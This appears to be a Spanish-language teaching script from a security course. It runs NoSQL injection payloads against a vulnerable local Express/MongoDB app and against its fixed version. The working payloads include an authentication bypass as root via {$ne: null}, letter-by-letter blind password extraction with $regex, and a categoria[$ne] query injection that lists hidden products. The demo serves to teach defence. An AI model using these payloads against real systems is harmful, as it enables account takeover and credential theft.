// Módulo 20 · F127 · El ataque contra MongoDB de verdad: entrar como root sin su clave, adivinarla letra a letra y
// listar productos ocultos. Requisitos: docker compose up -d --wait (MongoDB 9.0.8). Ejecuta: node f127-nosql/ataque.js
import { once } from 'node:events';
import { conectar, sembrar } from './datos.js';
import { crearApp as crearAntes } from './antes.js';
import { crearApp as crearDespues } from './despues.js';

const { cliente, db } = await conectar();
await sembrar(db);

async function atacar(nombre, app) {
  const servidor = app.listen(0);
  await once(servidor, 'listening');
  const base = `http://127.0.0.1:${servidor.address().port}`;
  const login = async (cuerpo) => {
    const r = await fetch(`${base}/login`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(cuerpo) });
    return `${r.status} ${await r.text()}`;
  };
  console.log(`== ${nombre}`);
  console.log(`   login normal (ana / ana123)                 -> ${await login({ usuario: 'ana', clave: 'ana123' })}`);
  console.log(`   {"usuario":"root","clave":{"$ne":null}}     -> ${await login({ usuario: 'root', clave: { $ne: null } })}`);
  // Extracción a ciegas: ¿la clave de root empieza por…? Cada 200 confirma un carácter más.
  for (const prefijo of ['^A', '^S', '^S3']) {
    console.log(`   {"clave":{"$regex":"${prefijo}"}}`.padEnd(47) + `-> ${(await login({ usuario: 'root', clave: { $regex: prefijo } })).slice(0, 3)}`);
  }
  const productos = async (query) => { const r = await fetch(`${base}/productos?${query}`); return `${r.status} ${await r.text()}`; };
  console.log(`   GET /productos?categoria=perifericos        -> ${await productos('categoria=perifericos')}`);
  console.log(`   GET /productos?categoria[$ne]=x             -> ${await productos('categoria[$ne]=x')}`);
  servidor.close();
}
await atacar('ANTES (vulnerable)', crearAntes(db));
await atacar('DESPUÉS (seguro)', crearDespues(db));
await cliente.close();
